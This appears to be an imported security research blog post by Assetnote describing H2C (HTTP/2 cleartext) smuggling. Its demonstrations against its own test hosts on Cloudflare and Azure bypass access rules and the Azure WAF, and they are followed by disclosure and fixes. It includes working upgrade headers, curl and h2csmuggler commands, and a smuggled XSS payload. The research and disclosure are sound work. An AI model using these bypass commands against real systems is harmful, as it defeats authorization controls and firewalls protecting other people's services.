---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-03-18_h2c-smuggling-in-the-wild.md
original_filename: 2021-03-18_h2c-smuggling-in-the-wild.md
title: H2C Smuggling in the Wild
category: documents
detected_topics:
- cloud-security
- access-control
- command-injection
- otp
- automation-abuse
- api-security
tags:
- imported
- documents
- cloud-security
- access-control
- command-injection
- otp
- automation-abuse
- api-security
language: en
raw_sha256: dc3cef7ede8ead96b3fe79f9c2a6312aff9adb33f65a42dbe01a665b27541bfc
text_sha256: fdd123156de1a38b15046ac7a493b03bce5485d1db04878ab3d1fee9ff741a34
ingested_at: '2026-06-28T07:32:05Z'
sensitivity: unknown
redactions_applied: true
---

# H2C Smuggling in the Wild

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-03-18_h2c-smuggling-in-the-wild.md
- Source Type: markdown
- Detected Topics: cloud-security, access-control, command-injection, otp, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:05Z
- Redactions Applied: True
- Raw SHA256: `dc3cef7ede8ead96b3fe79f9c2a6312aff9adb33f65a42dbe01a665b27541bfc`
- Text SHA256: `fdd123156de1a38b15046ac7a493b03bce5485d1db04878ab3d1fee9ff741a34`


## Content

---
title: "H2C Smuggling in the Wild"
url: "https://blog.assetnote.io/2021/03/18/h2c-smuggling/"
final_url: "https://www.assetnote.io/resources/research/h2c-smuggling-in-the-wild"
authors: ["Sean Yeoh (@seanyeoh)"]
bugs: ["HTTP request smuggling"]
publication_date: "2021-03-18"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3805
---

[Research Notes](/resources/research)

Security Research

March 18, 2021

# H2C Smuggling in the Wild

No items found.

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/653795bb35bc995a6f921d3f_citrixbleed.svg)

Creative Commons license

![](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a3671e476a7b1dc70cb6_h2c_preview.png)

6 months ago, Jake Miller released a blog article and python tool describing H2C smuggling, or http2 over cleartext smuggling. By using an obscure feature of http2, an attacker could bypass authorization controls on reverse proxies.

After noticing this article we started discussing this vulnerability, various exploitation scenarios and the potential widespread impact. From this discussion, we investigated the impact of H2C Smuggling on multiple cloud providers, discovering various authentication, routing and WAF bypasses.

1 month ago, PortSwigger named H2C Smuggling the top web hacking technique in 2020. After our findings in late 2020, we’re inclined to strongly agree with this ranking.

This blog post will go briefly into the technical details of H2C Smuggling, our findings on the impact of H2C smuggling across various bug bounty targets, and how we re-implemented [h2csmuggler.py](https://github.com/BishopFox/h2csmuggler) in Golang.

The first part of this article explains the context and potential vulnerability for http2 smuggling. For greater detail and context around this vulnerability, you can read Jake’s original [blog post](https://labs.bishopfox.com/tech-blog/h2c-smuggling-request-smuggling-via-http/2-cleartext-h2c). If you already understand the principles behind it, you can skip ahead to the [Exploitation](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#exploitation) section to find out how we exploited this in various cloud providers.

We’ve also open sourced the golang tooling used as part of this blog post, available [here](https://github.com/assetnote/h2csmuggler)

## Contents

  * [HTTP2 Over Cleartext (H2C)](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#h2c)
  * [Exploitation](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#exploitation)
  * [Cloudflare](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#cloudflare)
  * [Azure](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#azure)
  * [Google Cloud Platform](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#gcp)
  * [Other Cloud Providers](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#other)
  * [Takeaways on Security Research](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#takeaways)
  * [Assetnote](https://blog.assetnote.io/2021/03/18/h2c-smuggling/#assetnote)

## HTTP2 Over Cleartext (H2C)

A normal HTTP connection typically lasts only for the duration of a single request. However, H2C or “http2 over cleartext” is where a normal transient http connection is upgraded to a persistent connection that uses the http2 binary protocol to communicate continuously instead of for one request using the plaintext http protocol.

The second part of the smuggling occurs when a reverse proxy is used. Normally, when http requests are made to a reverse proxy, the proxy will handle the request, process a series of routing rules, then forward the request onto the backend and then return the response. When a http request includes a <span class="code_single-line">Connection: Upgrade</span> header, such as for a websocket connection, the reverse proxy will maintain the persistent connection between the client and server, allowing for the continuous communication needed for these procotols. For a H2C Connection, the RFC requires 3 headers to be present:
  
  
  Upgrade: h2c
  HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
  Connection: Upgrade, HTTP2-Settings
  
  

Now we note that when the reverse proxy normally handles a http request, it can process a series of routing rules. In Nginx, this might be routing different host headers to different backends, or routing different paths to different backends. It can also include processing like nginx’s WAF ModSecurity.

![Normal authorization controls on a reverse proxy](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a36753afc487e506c38b_h2c_copy_pasta_1.png)

Normal authorization controls on a reverse proxy

So where is the bug? When upgrading a connection, the reverse proxy will often stop handling individual requests, assuming that once the connection has been established, its routing job is done. Using H2C Smuggling, we can bypass rules a reverse proxy uses when processing requests such as path based routing, authentication, or the WAF processing provided we can establish a H2C connection first.

Our diagrams above and below demonstrates this by allowing requests on the root path, but denying requests on the /flag path. And with H2C smuggling, we are able to access the flag route despite not being able to normally. The caveat to this, is that if we can’t establish a H2C connection to begin with, we still are bound by all the reverse proxy rules.

![Bypassing the reverse proxy with H2C Smuggling](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a367fa2a66387971f0e2_h2c_copy_pasta_2.png)

Bypassing the reverse proxy with H2C Smuggling

## Exploitation

The original blog post points out that not all servers will forward the required headers for a compliant H2C connection upgrade. This means load balancers like AWS ALB/CLB, NGINX, and Apache Traffic Server amongst others will prevent a H2C connection by default. However, at the end of the blog post, he does mention that “not all backends were compliant, and we could test with the non-compliant <span class="code_single-line">Connection: Upgrade</span> variant, where the <span class="code_single-line">HTTP2-Settings</span> value is omitted from the <span class="code_single-line">Connection</span> header.”

![The original POCs handling of non-compliant h2c connections](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a367bc2d0c88d38b747e_h2c_1.png)

The original POCs handling of non-compliant h2c connections

So naturally, the question was. In a cloud setting, who provides reverse proxy services, and how can we exploit these services.

Some of the obvious answers are cloud providers: AWS ELBs, Azure Load Balancers, Google Load balancer. But less obviously, we also have providers like Cloudflare, who offer CDN like capabilities in addition to load balancing.

![Cloudflare offering proxied connections](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a367a99462c508160039_h2c_2.png)

Cloudflare offering proxied connections

### Setup

The setup requires having a server that will accept compliant and non-compliant H2C upgrade connections. I decided to modify the original demo Golang server to accept these non-compliant http connections.

This involved modifying the <span class="code_single-line">net/http/h2c</span> library used to handle H2C connections. The condition that is normally used to determine whether a connection should be upgraded is:

![net/http/h2c handling h2c upgrades for incoming connections](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a368623072c54669af2f_h2c_3.png)

net/http/h2c handling h2c upgrades for incoming connections

We instead opt to exclude the <span class="code_single-line">HTTP2-Settings</span> option, and instead just look for an <span class="code_single-line">Upgrade: h2c</span> header to assess whether the upgrade should occur.

![our modified h2c upgrade connection handler](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a367615b489d2f5e8c76_h2c_4.png)

our modified h2c upgrade connection handler

The second part is creating a client that will perform these requests. The original post outlined a workable PoC client however when working on this research we wrote our client from scratch in Golang to support our use case of detection of this vulnerability across large scale attack surfaces.

This involved heavily modifying the golang net/http library to be able to support forcing multiple requests over a single http connection, and being able to “Upgrade” a <span class="code_single-line">HTTP/1.1</span> <span class="code_single-line">https</span> connection to <span class="code_single-line">HTTP/2.0</span>. Both of these were definitely not conforming to any spec, and unfortunately, Golang did not have as nice http2 library like python’s h2. This meant that I had to dive into the <span class="code_single-line">net/http</span> code.

I had to create my own TCP connection that would be used to communicate, and perform the initial handshake and connection upgrade manually. The worst part was realising that as per the HTTP2 spec for H2C upgrades, the response to your initial upgrade request would be immediately queued on the connection for you to read, however nothing in the net/http library lets you read a single http2 response from a tcp connection. Consequently, a lot more modifications to the <span class="code_single-line">net/http2</span> transport were needed.

You can see the changes [here](https://github.com/assetnote/h2csmuggler)

### Goals

The first thing when setting out and researching for vulns is having a clear goal in mind. In this case it was:

  * Configure a server that upgrades non-compliant & compliant connections to H2C.
  * Find a load balancer that can be configured with routing rules or features
  * Establish a connection through the load balancer
  * Attempt to bypass the routing rules or features

When investigating these load balancers, we were looking for default configurations of the load balancers that would lead to vulnerabilities, even though we were using a non-compliant server. The rationale behind this is as most developers would attempt to configure their load balancer properly, they may not understand the internals of their reverse proxies/internal services hosted behind the load balancer and hence may be vulnerable even if their load balancer is configured properly.

## Cloudflare

Cloudflare offers “load balancing” in so far as proxying your requests through the cloudflare network and offering a variety of service enhancements leveraging this (such as caching and content acceleration). As part of these enhancements is Cloudflare Access, an authentication service enforced by the load balancer. For example, you can configure rules on paths:

![Cloudflare access policy control](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a368cf0959a38b92f07f_h2c_7.png)

Cloudflare access policy control

In our initial testing, we noted that Cloudflare when proxing our requests modified the <span class="code_single-line">Upgrade</span> header to exclude <span class="code_single-line">HTTP2-Settings</span> however kept our other headers . :)
  
  
  INFO[866915] recieved headers="map[Accept-Encoding:[gzip] Cdn-Loop:[cloudflare] Cf-Connecting-Ip:[119.18.6.240] Cf-Ray:[5eebda014e4716ad-SYD] Cf-Request-Id:[06474694cf000016ad5f226000000001] Cf-Visitor:[{\"scheme\":\"http\"}] Connection:[Upgrade] Http2-Settings:[AAMAAABkAARAAAAAAAIAAAAA] Upgrade:[h2c] Cf-Ipcountry:[AU] User-Agent:[Go-http-client/1.1] X-Forwarded-For:[119.18.6.240] X-Forwarded-Proto:[http]]" host=jump-h2c-host.assetnote.dev method=GET path=/
  
  

This meant that we should be able to suceed in bypassing our Cloudflare Access Rules!
  
  
  $ curl https://jump-h2c-host.assetnote.dev/flag -I
  
  HTTP/2 403
  date: Thu, 10 Sep 2020 10:35:13 GMT
  content-type: text/html
  set-cookie: __cfduid=d7cdda4649773b7837cbce849409a530e1599734113; expires=Sat, 10-Oct-20 10:35:13 GMT; path=/; domain=.assetnote.dev; HttpOnly; SameSite=Lax; Secure
  cf-request-id: ***REDACTED-SUSPECT-TOKEN***  expect-ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
  server: cloudflare
  cf-ray: 5d0880446dd9fd32-SYD
  
  
  
  
  $ h2csmuggler.py -x https://jump-h2c-host.assetnote.dev https://jump-h2c-host.assetnote.dev/flag
  
  [INFO] h2c stream established successfully.
  :status: 200
  content-type: text/plain; charset=utf-8
  content-length: 20
  date: Thu, 10 Sep 2020 10:33:51 GMT
  Hello, /, http: true
  
  [INFO] Requesting - /flag
  :status: 200
  content-type: text/plain; charset=utf-8
  content-length: 17
  date: Thu, 10 Sep 2020 10:33:51 GMT
  
  You got the flag!
  
  

Huge success!

#### Reporting

Reporting to Cloudflare’s public bug bounty program was an incredibly pleasant experience! They were very responsive and very receptive to our research. In the multiple iterations of fixes, they had to balance customer expectations around servicing H2C connections (<https://community.cloudflare.com/t/http-h2c-upgrade-requests-result-in-connection-reset-by-peer/214761>). Despite these challenges, they kept us in the loop.

#### Cloudflare Outcome

Their final fix involved stripping all headers related to H2C, causing the connection to be processed normally as expected.
  
  
  INFO[866915] recieved headers="map[Accept-Encoding:[gzip] Cdn-Loop:[cloudflare] Cf-Connecting-Ip:[119.18.6.240] Cf-Ipcountry:[AU] Cf-Ray:[5e9a63bc8f2cd695-SYD] Cf-Request-Id:[06145ca9d80000d695280b0000000001] Cf-Visitor:[{\"scheme\":\"http\"}] Connection:[Keep-Alive] User-Agent:[Go-http-client/1.1] X-Forwarded-For:[119.18.6.240] X-Forwarded-Proto:[http]]" host=jump-h2c-host.assetnote.dev method=GET path=/
  
  

## Azure

Azure presents the most interesting use case for impact. Rather than simply bypassing routing rules, Azure Application Gateways offer the ability to attach the Azure WAF (<https://docs.microsoft.com/en-us/azure/web-application-firewall/ag/ag-overview>) to the gateway.

In this case, the access gateway will remove <span class="code_single-line">HTTP2-Settings</span> from the <span class="code_single-line">Upgrade</span> header however leave the rest untouched!
  
  
  INFO*[7632]* upgrading request headers="map[Accept:[*/*] Accept-Encoding:[gzip] Connection:[upgrade] Http2-Settings:[AAMAAABkAARAAAAAAAIAAAAA] Upgrade:[h2c] User-Agent:[Go-http-client/1.1] X-Forwarded-For:[119.18.6.240:44302] X-Forwarded-Port:[80] X-Forwarded-Proto:[http] X-Original-Host:[52.188.24.146] X-Original-Url:[/]]" host=52.188.24.146 method=GET url=/
  INFO*[7632]* recieved headers="map[Accept:[*/*] Accept-Encoding:[gzip] User-Agent:[Go-http-client/1.1] X-Forwarded-For:[119.18.6.240:44302] X-Forwarded-Port:[80] X-Forwarded-Proto:[http] X-Original-Host:[52.188.24.146] X-Original-Url:[/]]" host=52.188.24.146 method=GET path=/
  
  

That said, we can now use this to bypass routing rules.
  
  
  sean at pop-os in ~/tools/web/h2csmuggler (master●)
  $ curl 52.188.24.146/flag -I
  HTTP/1.1 301 Moved Permanently
  Server: Microsoft-Azure-Application-Gateway/v2
  Date: Fri, 25 Sep 2020 07:20:47 GMT
  Content-Type: text/html
  Content-Length: 195
  Connection: keep-alive
  Location: http:*//example.com/flag*
  
  $ go run ./cmd/h2csmuggler smuggle http://52.188.24.146 'http://52.188.24.146/flag' -H 'Accept: */*' -v -P
  DEBU[0000] Log level set to: debug
  [H2C Smuggling detected on http://52.188.24.146/flag]
  [Smuggled response]
  HTTP/2.0 200 OK
  Content-Length: 17
  Content-Type: text/plain; charset=utf-8
  Date: Thu, 29 Oct 2020 07:34:56 GMT
  You got the flag!
  
  

More importantly, when the Azure WAF is configured, this provides a global WAF bypass provided your first request does not get blocked by the WAF and you can establish a H2C Connection.
  
  
  sean at pop-os in ~/tools/web/h2csmuggler (master●●)
  $ curl "52.188.24.146/?param=<script>alert(1)</script>"
  <html>
  <head><title>403 Forbidden</title></head>
  <body>
  <center><h1>403 Forbidden</h1></center>
  <hr><center>Microsoft-Azure-Application-Gateway/v2</center>
  </body>
  </html>
  
  
  
  
  sean at pop-os in ~/tools/web/h2csmuggler (master●●)
  $ go run ./cmd/h2csmuggler smuggle http://52.188.24.146 'http://52.188.24.146/?param=<script>alert(1)</script>' -H 'Accept: */*' -v -P
  DEBU[0000] Log level set to: debug
  [H2C Smuggling detected on http://52.188.24.146/?param=<script>alert(1)</script>]
  [Smuggled response]
  HTTP/2.0 200 OK
  Content-Length: 54
  Content-Type: text/plain; charset=utf-8
  Date: Thu, 29 Oct 2020 07:35:32 GMT
  Hello, /, param=<script>alert(1)</script>, http: true
  
  

#### Reporting

Reporting to [secure@microsoft.com](mailto:secure@microsoft.com) was again a painless and smooth process. However, much like other cloud providers, fixes had to be well communicated and tested to ensure minimal customer impact when applying necessary security fixes.

#### Azure Outcome

Azure acknowledged the vulnearbility as a complete WAF bypass. We were notified that the fix timeline was Q1 2021, thus disclosure was delayed until the fix was implemented.

## Google Cloud Platform

Google Load Balancer allows you to configure basic routing rules on your load balancer.

![GLB with path based routing rules](https://cdn.prod.website-files.com/64233a8baf1eba1d72a641d4/65a3a368eb466b0db7ec8eac_h2c_8.png)

GLB with path based routing rules

However, when attempting to perform a http upgrade, the load balancer strips all Connection and Http2-Settings headers. As such, without the HTTP2-Settings header, there’s no way to upgrade the connection.
  
  
  # Client
  
  TRAC[0000] performing upgrade request headers="map[Connection:[Upgrade, HTTP2-Settings] Http2-Settings:[AAMAAABkAARAAAAAAAIAAAAA] Upgrade:[h2c]]"
  TRAC[0000] establishing tcp conn on: gce-alb-h2.assetnote.dev:80
  TRAC[0000] upgrade request complete body="Hello, /, , http: true" headers="map[Content-Length:[23] Content-Type:[text/plain; charset=utf-8] Date:[Thu, 29 Oct 2020 05:01:38 GMT] Via:[1.1 google]]" status=200
  TRAC[0000] unexpected status code: 200
  
  # Server
  
  INFO[11036] upgrading request headers="map[Accept-Encoding:[gzip] Cdn-Loop:[google] Connection:[Keep-Alive] Upgrade:[h2c] User-Agent:[Go-http-client/1.1] Via:[1.1 google] X-Cloud-Trace-Context:[252485cf6390a2e2c5f07b62c0391e99/13544612580954245206] X-Forwarded-For:[119.18.6.240, 34.102.145.17] X-Forwarded-Proto:[http]]" host=gce-alb-h2.assetnote.dev method=GET url=/
  INFO[11036] recieved headers="map[Accept-Encoding:[gzip] Cdn-Loop:[google] Connection:[Keep-Alive] Upgrade:[h2c] User-Agent:[Go-http-client/1.1] Via:[1.1 google] X-Cloud-Trace-Context:[252485cf6390a2e2c5f07b62c0391e99/13544612580954245206] X-Forwarded-For:[119.18.6.240, 34.102.145.17] X-Forwarded-Proto:[http]]" host=gce-alb-h2.assetnote.dev method=GET path=/
  
  

#### GLB Outcome

Due to the way GLB handles these connections GCP was not vulnerable to H2C smuggling.

## Other Cloud Providers

There are other cloud providers that are vulnerable to this attack using H2C smuggling however at time of publishing, we were not given disclosure permission.

## Takeaways on Security Research

Finding vulnerabilities in major cloud providers is both a lucky and methodical process. Although Jake mentioned that cloud providers such as AWS would not be vulnerable to H2C smuggling in his testing, a further application of his research yielded fruitful results. In this process I realised that even the best security researchers make assumptions about their research or may not have the time needed to find all affected parties. Consequently, even when research is made public there are often plenty of opportunities to extend and further the research.

## Assetnote

For developers and users of cloud load balancers, it is important to note that security measures on only the load balancer can be insufficient when restricting access or securing your application.

It is often difficult to stay on top of these nuanced configuration issues, particularly across a large and fluid cloud attack surface. For the past 5 months across our existing customers, we found multiple instances of off-the-shelf configured services that permited H2C upgrades to occur, potentially bypassing authorization controls placed on interim reverse proxies. Assetnote’s Continuous Security Platform will continuously map out and monitor your attack surface to ensure that your services are not vulnerable to H2C smuggling and other impactful security vulnerabilities.

On a final note, Assetnote is hiring across a number of engineering and security roles. One of the best parts of working at Assetnote is the ability to combine interesting engineering challenges with security research as part of the every day work on our products. If you are interested in joining our team and working on cutting edge security products check out our [careers page](https://assetnote.io/company/careers.html).

Written by:

Sean Yeoh

Your subscription could not be saved. Please try again. 

Your subscription has been successful. 

Get updates on our research

Subscribe to our newsletter and stay updated on the newest research, security advisories, and more!

Enter your email address to subscribe

Provide your email address to subscribe. For e.g abc@xyz.com 

SUBSCRIBE 

### More Like This

[Security ResearchNew!Doing the Due Diligence: Analyzing the Next.js Middleware Bypass (CVE-2025-29927)Read moreRead on ASN Blog](/resources/research/doing-the-due-diligence-analyzing-the-next-js-middleware-bypass-cve-2025-29927)

[Security ResearchNew!How an obscure PHP footgun led to RCE in Craft CMSRead moreRead on ASN Blog](/resources/research/how-an-obscure-php-footgun-led-to-rce-in-craft-cms)

[Security ResearchNew!Citrix Denial of Service: Analysis of CVE-2024-8534Read moreRead on ASN Blog](/resources/research/citrix-denial-of-service-analysis-of-cve-2024-8534)

[Security ResearchNew!Nginx/Apache Path Confusion to Auth Bypass in PAN-OS (CVE-2025-0108)Read moreRead on ASN Blog](/resources/research/nginx-apache-path-confusion-to-auth-bypass-in-pan-os)

[Security ResearchNew!Leveraging An Order of Operations Bug to Achieve RCE in Sitecore 8.x - 10.xRead moreRead on ASN Blog](/resources/research/leveraging-an-order-of-operations-bug-to-achieve-rce-in-sitecore-8-x---10-x)

[Security ResearchNew!Insecurity through Censorship: Vulnerabilities Caused by The Great FirewallRead moreRead on ASN Blog](/resources/research/insecurity-through-censorship-vulnerabilities-caused-by-the-great-firewall)

[Back to All](/resources/research)

### Ready to get started?

Get on a call with our team and learn how Assetnote can change the way you secure your attack surface. We'll set you up with a trial instance so you can see the impact for yourself.

[Request a Demo](/demo)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/64241df2676aeba82706ffe8_assetnote-logo.svg)

Address:  
Level 10, 12 Creek Street, Brisbane QLD, 4000  
‍  
Contact:  
[contact@assetnote.io  
  
](mailto:contact@assetnote.io)Press Inquiries:[  
](mailto:contact@assetnote.io)[press@assetnote.io](mailto:press@assetnote.io)

![](https://cdn.prod.website-files.com/6422e507d5004f85d107063a/661f041240ed96ed7a03fe6f_61dc1beb212a1202fc512a76_SOC%202-03-p-500.png)

[](https://twitter.com/assetnote)[](https://www.linkedin.com/company/assetnote/)

Platform Features

[Continuous Asset Discovery](/platform/asset-discovery)

[Deep Asset Enrichment](/platform/asset-enrichment)

[Assetnote Exposure Engine](/platform/assetnote-exposure-engine)

[Expert Security Research](/platform/expert-security-research)

[Collaborative Workflows](/platform/collaborative-workflows)

[Customization](/platform/customization)

Use Cases

[Continuous Asset Discovery and Inventory](/use-cases/continuous-asset-discovery-and-inventory)

[Real-Time Exposure Monitoring](/use-cases/continuous-security-monitoring)

[Attack Surface Reduction](/use-cases/attack-surface-reduction)

[Mergers & Acquisitions](/use-cases/mergers-and-acquisitions)

[Bug Bounty Readiness](/use-cases/bug-bounty-readiness)

© 2026 Assetnote. All rights reserved.

[Privacy Policy](https://assetnote.io/policies/privacy-policy)
